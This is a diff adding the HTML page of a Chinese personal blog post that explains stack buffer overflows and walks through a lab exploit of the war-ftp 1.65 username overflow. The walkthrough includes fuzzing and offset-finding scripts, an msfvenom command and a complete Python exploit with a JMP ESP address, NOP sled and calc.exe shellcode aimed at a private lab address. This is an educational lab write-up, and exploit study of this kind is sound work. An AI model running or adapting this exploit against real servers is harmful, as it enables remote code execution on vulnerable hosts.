@@ -1,0 +1,639 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"bmoos.github.io","root":"/","scheme":"Mist","version":"7.7.1","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="缓冲区溢出攻击和实战war-ftp前言​        最近看到看雪学院有篇博客写的FUZZ测试和漏洞利用，里面有介绍war-ftp 1.65版本存在缓冲区漏洞，之前有做过war-ftp 1.65的缓冲区攻击，不过当时应付差事，匆忙一做，最近学了一段时间的逆向，现在重新做做，重新理解一下。(本来这篇博客快做好了，想着有些累就睡觉了，结果一觉醒来上传到搜狗图床的图没了，淦，结果又重做了一次截了图，思">
+<meta property="og:type" content="article">
+<meta property="og:title" content="缓冲区溢出攻击和实战war-ftp">
+<meta property="og:url" content="https://bmoos.github.io/2020/06/20/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%92%8C%E5%AE%9E%E6%88%98war-ftp/index.html">
+<meta property="og:site_name" content="BMooS">
+<meta property="og:description" content="缓冲区溢出攻击和实战war-ftp前言​        最近看到看雪学院有篇博客写的FUZZ测试和漏洞利用，里面有介绍war-ftp 1.65版本存在缓冲区漏洞，之前有做过war-ftp 1.65的缓冲区攻击，不过当时应付差事，匆忙一做，最近学了一段时间的逆向，现在重新做做，重新理解一下。(本来这篇博客快做好了，想着有些累就睡觉了，结果一觉醒来上传到搜狗图床的图没了，淦，结果又重做了一次截了图，思">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/22/N8HFII.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/22/N8HmQS.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/22/NJON3n.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/22/NJOwuV.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/22/N8HgyD.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/22/NJOy4J.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/22/NJmrvV.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/22/NJnoJs.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/22/NJKyKP.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/22/NJK7rV.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/22/NJQfcn.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/22/NJlaUU.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/22/NJl6Dx.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/22/NJ1yWQ.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/22/NJ1ldK.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/22/NJyA2R.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/22/NJRg58.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/22/NJfSSg.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/22/NJfRXj.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/22/NJhsbR.png">
+<meta property="article:published_time" content="2020-06-20T08:27:18.000Z">
+<meta property="article:modified_time" content="2020-06-22T12:04:42.927Z">
+<meta property="article:author" content="BMooS">
+<meta property="article:tag" content="python">
+<meta property="article:tag" content="exp">
+<meta property="article:tag" content="缓冲区溢出">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2020/06/22/N8HFII.png">
+
+<link rel="canonical" href="https://bmoos.github.io/2020/06/20/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%92%8C%E5%AE%9E%E6%88%98war-ftp/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>缓冲区溢出攻击和实战war-ftp | BMooS</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?5a6862eba0dd0e57faf5fff97dbcb849";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="BMooS" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">BMooS</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://bmoos.github.io/2020/06/20/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%92%8C%E5%AE%9E%E6%88%98war-ftp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://s2.ax1x.com/2020/01/15/lOIrB4.jpg">
+      <meta itemprop="name" content="BMooS">
+      <meta itemprop="description" content="BMooS的个人博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BMooS">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          缓冲区溢出攻击和实战war-ftp
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-06-20 16:27:18" itemprop="dateCreated datePublished" datetime="2020-06-20T16:27:18+08:00">2020-06-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-06-22 20:04:42" itemprop="dateModified" datetime="2020-06-22T20:04:42+08:00">2020-06-22</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%80%86%E5%90%91/" itemprop="url" rel="index">
+                    <span itemprop="name">逆向</span>
+                  </a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="缓冲区溢出攻击和实战war-ftp"><a href="#缓冲区溢出攻击和实战war-ftp" class="headerlink" title="缓冲区溢出攻击和实战war-ftp"></a>缓冲区溢出攻击和实战war-ftp</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        最近看到看雪学院有篇<a href="https://bbs.pediy.com/thread-259883.htm" target="_blank" rel="noopener">博客</a>写的FUZZ测试和漏洞利用，里面有介绍war-ftp 1.65版本存在缓冲区漏洞，之前有做过war-ftp 1.65的缓冲区攻击，不过当时应付差事，匆忙一做，最近学了一段时间的逆向，现在重新做做，重新理解一下。(本来这篇博客快做好了，想着有些累就睡觉了，结果一觉醒来上传到搜狗图床的图没了，淦，结果又重做了一次截了图，思路都打断了，MD)</p>
+<a id="more"></a>
+
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="什么是缓冲区溢出"><a href="#什么是缓冲区溢出" class="headerlink" title="什么是缓冲区溢出"></a>什么是缓冲区溢出</h3><p>这里引用一下百度的解释</p>
+<blockquote>
+<p>​        缓冲区溢出是指当计算机向缓冲区内填充数据位数时超过了缓冲区本身的容量，溢出的数据覆盖在合法数据上。理想的情况是：程序会检查数据长度，而且并不允许输入超过缓冲区长度的字符。但是绝大多数程序都会假设数据长度总是与所分配的储存空间相匹配，这就为缓冲区溢出埋下隐患。操作系统所使用的缓冲区，又被称为“堆栈”，在各个操作进程之间，指令会被临时储存在“堆栈”当中，“堆栈”也会出现缓冲区溢出。</p>
+</blockquote>
+<p>解释的很到位，但是如果了解学习过逆向和汇编的同学，我觉得下面这张图(从上面介绍的那篇博客中引用)可能会有帮助：</p>
+<p><img src="https://s1.ax1x.com/2020/06/22/N8HFII.png" alt="N8HFII.png"></p>
+<p>原博主的话：</p>
+<blockquote>
+<p>​        图中函数F1在调用F2之前，F1会保存F2结束以后的返回地址，然后移交给F2执行，F2执行完毕后，根据记录的返回地址复原栈帧，继续执行F1函数。在图1中可以看出，当向一个有栈溢出漏洞的程序发送大量数据时，ESP、EBP等寄存器都可以被垃圾数据淹没。由于EIP寄存器存放下一条指令的地址，因此可以编写一个Exploit程序，使EIP指向预设的一段叫做Shellcode的指令，从而达到控制系统的目的。由于栈的布局原因，通常使用JMP ESP指令来覆盖返回地址，并且将Shellcode存放到ESP处，从而引导CPU执行Shellcode。</p>
+</blockquote>
+<p>在函数被调用的的过程中，首先将参数放到寄存器或者压入栈中，然后调用call，对于栈来说：</p>
+<blockquote>
+<p>PUSH EIP</p>
+<p>PUSH EBP</p>
+<p>MOV EBP,ESP</p>
+</blockquote>
+<p>那么此时EBP所指向的地址中保存的就是old EBP的值，用来之后恢复栈，然后call之后会在栈中压入此时执行函数的局部变量，函数执行完毕时， 可以调用leave指令当结语，也可以调整ESP的位置，释放局部变量，最后使用ret指令返回，将CPU的控制权由被调函数返回给调用函数，对于栈结构来说则会：</p>
+<blockquote>
+<p>MOV ESP,EBP</p>
+<p>POP EBP</p>
+<p>POP EIP</p>
+</blockquote>
+<p><img src="https://s1.ax1x.com/2020/06/22/N8HmQS.png" alt="N8HmQS.png"></p>
+<h3 id="如何利用缓冲区溢出"><a href="#如何利用缓冲区溢出" class="headerlink" title="如何利用缓冲区溢出"></a>如何利用缓冲区溢出</h3><p>​        如果被调用函数的局部变量超过了程序给它分配的空间，因为数据是从较低内存地址向较高内存地址增长的，而栈的结构是从较高内存地址向较低内存地址增长的，那么此时数据就会覆盖掉用来恢复原本栈结构的EIP内容，造成被调函数返回时，调用函数不能正确的恢复EIP的内容。</p>
+<p><img src="https://s1.ax1x.com/2020/06/22/NJON3n.png" alt="NJON3n.png"></p>
+<p>​        而此时发现当被调用函数返回时候，寄存器EIP中内容可控，那么攻击者则可以精心构造被调用函数的局部变量，从而使用特定的值来覆盖原本保存EIP的值。</p>
+<p>​        为了能让CPU执行shellcode，有一种方式就是利用篡改的EIP的值，让EIP内的值指向JMP ESP指令，从而执行它，而ESP内的值是在POP EIP后，指向比覆盖EIP值的内存地址高的栈空间中，也是就在构造的覆盖EIP字节之后的几个字节中，只要找到偏移量，就可以定位到ESP指向的值，然后来设计shellcode</p>
+<p><img src="https://s1.ax1x.com/2020/06/22/NJOwuV.png" alt="NJOwuV.png"></p>
+<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>​        这里我们用war-ftp 1.65版本来做实验，这个软件可谓是经典缓冲区溢出攻击靶场软件(笑)，软件是用的类C语言编写的轻量级免费开源的FTP服务器软件，FTP客户端登陆时用户名存在缓冲区溢出漏洞：</p>
+<p><img src="https://s1.ax1x.com/2020/06/22/N8HgyD.png" alt="N8HgyD.png"></p>
+<p>（上图搜索结果显示password也有缓冲区溢出，看介绍应该是存在Windows 2000系统上，有机会测试测试）</p>
+<blockquote>
+<p>测试环境：</p>
+<p>操作系统：Windows XP SP3</p>
+<p>测试软件：war-ftp 1.65</p>
+<p>调试软件：Immunity debugger</p>
+<p>ip地址：192.168.247.128</p>
+</blockquote>
+<p>先FUZZ测试一下</p>
+<p><img src="https://s1.ax1x.com/2020/06/22/NJOy4J.png" alt="NJOy4J.png"></p>
+<p>可以看到当username过长时，程序中断崩溃，在immunity debugger上看到：</p>
+<p><img src="https://s1.ax1x.com/2020/06/22/NJmrvV.png" alt="NJmrvV.png"></p>
+<p>寄存器内容被覆盖(EIP内41是A的ASCII码)</p>
+<p>这样，我们可以借用网上的POC</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket, sys</span><br><span class="line"> </span><br><span class="line">target = <span class="string">'192.168.247.128'</span></span><br><span class="line">payload = <span class="string">'A'</span> * int(sys.argv[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Payload length = %s\n"</span> % sys.argv[<span class="number">1</span>]</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_exploit</span><span class="params">()</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.settimeout(<span class="number">1</span>)</span><br><span class="line">    s.connect((target, <span class="number">21</span>))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s.send(<span class="string">'user %s\r\n'</span> % payload)</span><br><span class="line">        <span class="keyword">print</span> s.recv(<span class="number">1000</span>)</span><br><span class="line">        s.send(<span class="string">'pass test\r\n'</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[+] server is down"</span></span><br><span class="line">    s.close()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    send_exploit()</span><br></pre></td></tr></table></figure>
+
+<p>测试结果：</p>
+<p><img src="https://s1.ax1x.com/2020/06/22/NJnoJs.png" alt="NJnoJs.png"></p>
+<p>输入1000时候，服务器崩溃连不上，那么说明在上一次500字符用户名的时候就已经出现缓冲区溢出了。</p>
+<p>为了确定在字符中第几个能覆盖到EIP和EBP，使用mona插件来生成1000个字符计算偏移：</p>
+<p><img src="https://s1.ax1x.com/2020/06/22/NJKyKP.png" alt="NJKyKP.png"></p>
+<p>生成目录在immunity debugger安装目录下</p>
+<p><img src="https://s1.ax1x.com/2020/06/22/NJK7rV.png" alt="NJK7rV.png"></p>
+<p>用python测试一下pattern</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ftplib <span class="keyword">import</span> FTP</span><br><span class="line"></span><br><span class="line">ftp = FTP()</span><br><span class="line">username = <span class="string">'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B'</span></span><br><span class="line">port = <span class="number">21</span></span><br><span class="line">ftp.connect(<span class="string">'192.168.247.128'</span>,port)</span><br><span class="line">ftp.login(username,<span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line">ftp.quit()</span><br></pre></td></tr></table></figure>
+
+<p>测试结果：</p>
+<p><img src="https://s1.ax1x.com/2020/06/22/NJQfcn.png" alt="NJQfcn.png"></p>
+<p>可以发现 EIP=32714131 [ESP]=71413471 用mona插件来计算一下偏移：</p>
+<p><img src="https://s1.ax1x.com/2020/06/22/NJlaUU.png" alt="NJlaUU.png"></p>
+<p>EIP的偏移是485</p>
+<p><img src="https://s1.ax1x.com/2020/06/22/NJl6Dx.png" alt="NJl6Dx.png"></p>
+<p>ESP的偏移是493</p>
+<p>这意味着，向用户名发送485个字节可以定位到EIP，8个字节之后则是ESP，而485个字节后的EIP寄存器开始被缓冲区覆盖，那么EIP中486-489字节是我们想要的目标。</p>
+<p>接下来确定JMP ESP的地址，用immunity debugger中的executable modules来找到kernel32.dll系统文件，在kernel32.dll寻找JMP ESP的地址</p>
+<p><img src="https://s1.ax1x.com/2020/06/22/NJ1yWQ.png" alt="NJ1yWQ.png"></p>
+<p>发现有一条JMP ESP指令的地址是0x7C86467B，那么可以给EIP赋值为0x7C86467B，则CPU运行指令就会到ESP所指向的地址，也就是输入的第493个字节之后写入shellcode</p>
+<p><img src="https://s1.ax1x.com/2020/06/22/NJ1ldK.png" alt="NJ1ldK.png"></p>
+<p>接下来生成shellcode，这里我用的是Metasploit直接生成的方式，在kali机中输入</p>
+<p><code>msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -a x86 --platform windows -b &#39;\x00\x0d\x0a\x40&#39; -f c</code></p>
+<p>其中，“-p”是指攻击载荷（payload），在windows/exec方式下可以打开计算器程序（calc.exe）；“EXITFUNC”指定退出方式；“-a x86 –platform windows”指程序运行平台，“x86、windows”是默认选项，对于本程序来说可以忽略不填，可根据实际需要填写；“-b”是排除坏字符，因为传递的都是字符串，必须要遵守字符限制的FTP 协议。这就意味着没有空，返回，换行，或是@符号，他们用16进制的表示为\x00,\x0d,\x0a,\x40。“-f”是指以C程序的方式生成Shellcode，略作修改即可在Python中使用。</p>
+<p><img src="https://s1.ax1x.com/2020/06/22/NJyA2R.png" alt="NJyA2R.png"></p>
+<p>那么现在可以来写exp了，首先我们要对缓冲区写入485个’A’来定位到EIP，然后写入在kernel32.dll中指令JMP ESP的地址0x7C86467B，x86程序使用小端字节序为：\x7B\x46\x86\x7C，然后再填充4个字节以便到达shellcode入口处，为了能让shellcode顺利执行，我们需要填充多个nop指令，也就是\x90字节，让CPU滑到shellcode执行。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ftplib <span class="keyword">import</span> FTP</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">'\xbd\xc9\x0e\x48\x97\xda\xd1\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x31\x31\x68\x13\x03\x68\x13\x83\xe8\x35\xec\xbd\x6b\x2d\x73\x3d\x94\xad\x14\xb7\x71\x9c\x14\xa3\xf2\x8e\xa4\xa7\x57\x22\x4e\xe5\x43\xb1\x22\x22\x63\x72\x88\x14\x4a\x83\xa1\x65\xcd\x07\xb8\xb9\x2d\x36\x73\xcc\x2c\x7f\x6e\x3d\x7c\x28\xe4\x90\x91\x5d\xb0\x28\x19\x2d\x54\x29\xfe\xe5\x57\x18\x51\x7e\x0e\xba\x53\x53\x3a\xf3\x4b\xb0\x07\x4d\xe7\x02\xf3\x4c\x21\x5b\xfc\xe3\x0c\x54\x0f\xfd\x49\x52\xf0\x88\xa3\xa1\x8d\x8a\x77\xd8\x49\x1e\x6c\x7a\x19\xb8\x48\x7b\xce\x5f\x1a\x77\xbb\x14\x44\x9b\x3a\xf8\xfe\xa7\xb7\xff\xd0\x2e\x83\xdb\xf4\x6b\x57\x45\xac\xd1\x36\x7a\xae\xba\xe7\xde\xa4\x56\xf3\x52\xe7\x3c\x02\xe0\x9d\x72\x04\xfa\x9d\x22\x6d\xcb\x16\xad\xea\xd4\xfc\x8a\x15\x37\xd5\xe6\xbd\xee\xbc\x4b\xa0\x10\x6b\x8f\xdd\x92\x9e\x6f\x1a\x8a\xea\x6a\x66\x0c\x06\x06\xf7\xf9\x28\xb5\xf8\x2b\x4b\x58\x6b\xb7\xa2\xff\x0b\x52\xbb'</span></span><br><span class="line">ftp = FTP()</span><br><span class="line">port = <span class="number">21</span></span><br><span class="line">ftp.connect(<span class="string">'192.168.247.128'</span>,port)</span><br><span class="line">username = <span class="string">'A'</span>*<span class="number">485</span>+<span class="string">'\x7B\x46\x86\x7C'</span>+<span class="string">'A'</span>*<span class="number">4</span>+<span class="string">'\x90'</span>*<span class="number">10</span>+shellcode</span><br><span class="line">ftp.login(username,<span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line">ftp.quit()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s1.ax1x.com/2020/06/22/NJRg58.png" alt="NJRg58.png"></p>
+<p>可以看到原程序崩溃，计算器以线程方式弹出</p>
+<p>最后，我想说的是，其实ESP之后的栈空间也是具有限制的，比如本次实验中可以发现，当以1200+个字节内容进行测试时，最终停留在了一个名为msvcrt.dll的DLL文件中，而这里的EIP与41414141完全不同。另外，当payload大小为1100字节或以下时，仍然控制着EIP。</p>
+<p><img src="https://s1.ax1x.com/2020/06/22/NJfSSg.png" alt="NJfSSg.png"></p>
+<p><img src="https://s1.ax1x.com/2020/06/22/NJfRXj.png" alt="NJfRXj.png"></p>
+<p>可以通过16进制计算得到此时EIP指向的地址在msvcrt.dll文件中</p>
+<p><img src="https://s1.ax1x.com/2020/06/22/NJhsbR.png" alt="NJhsbR.png"></p>
+<p>由此可以计算出exp可利用的空间，这一点在写payload的时候非常重要。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/python/" rel="tag"># python</a>
+              <a href="/tags/exp/" rel="tag"># exp</a>
+              <a href="/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" rel="tag"># 缓冲区溢出</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/05/21/vbs%E7%AA%83%E5%AF%86%E8%84%9A%E6%9C%AC/" rel="prev" title="vbs窃密脚本">
+      <i class="fa fa-chevron-left"></i> vbs窃密脚本
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
